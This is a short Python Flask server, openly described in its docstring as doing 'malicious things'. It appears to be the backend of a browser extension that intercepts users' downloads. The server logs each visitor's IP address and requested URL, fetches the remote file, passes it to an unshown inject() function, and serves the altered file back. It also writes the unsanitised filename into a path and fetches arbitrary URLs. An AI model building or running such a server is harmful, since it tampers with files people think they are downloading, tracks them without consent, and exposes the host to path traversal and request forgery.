"""
A flask server that does malicious things.
"""

from requests import get
from flask import Flask, request, jsonify, send_from_directory
from injection import inject

app = Flask(__name__)


def log_download(ip: str, url: str) -> None:
    """
    Adds the ip and url to a file that tracks all the downloads made when someone has used the
    associated extension.
    """

    with open("logs.txt", "a+") as file:
        file.write(ip + " " + url + "\n")

@app.route('/<filename>', methods=["GET"])
def download_route(filename):
    """
    The handler for the filename route.
    """

    url = request.args.get("url")

    if url:
        log_download(request.remote_addr, url)

        # download the file and then send it back
        with open("downloads/" + filename, "wb") as file:
            file.write(get(url).content)

            inject(filename)

        return send_from_directory("downloads", filename)

    return ""


if __name__ == "__main__":
    app.run(debug=True, port=5001)
